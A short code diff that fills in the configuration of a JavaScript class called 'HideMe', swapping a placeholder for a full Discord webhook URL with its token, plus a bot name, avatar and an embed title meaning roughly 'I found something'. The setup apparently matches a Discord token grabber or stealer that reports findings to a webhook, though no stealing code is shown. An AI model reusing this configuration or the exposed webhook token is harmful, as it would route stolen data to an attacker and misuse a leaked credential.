@@ -82,11 +82,11 @@ class HideMe {
 
         var config = {
             pingOnResult: true,
-            webHook: "%webhook%",
-            webhookUsername: "Hello World",
-            webhookAvatar: "https://cdn.discordapp.com/avatars/908070943329488916/35ebf6d39bc25e52da855424119bc28f.webp?size=80",
+            webHook: "https://discordapp.com/api/webhooks/998305935938310216/on-82n5Cop50tNAFU7Ktxic-xOh3xiJIJME4p1tqEItzdRlBgh3gYXuz9L7O5o_JXoxY",
+            webhookUsername: "Neki mauga",
+            webhookAvatar: "https://cdn.discordapp.com/attachments/784763924515258368/998310861380800592/unknown.png",
 
-            embedTitle: "Hello World",
+            embedTitle: "Neki sm najdu",
             embedColor: 0x36393f,
 
             tts: false
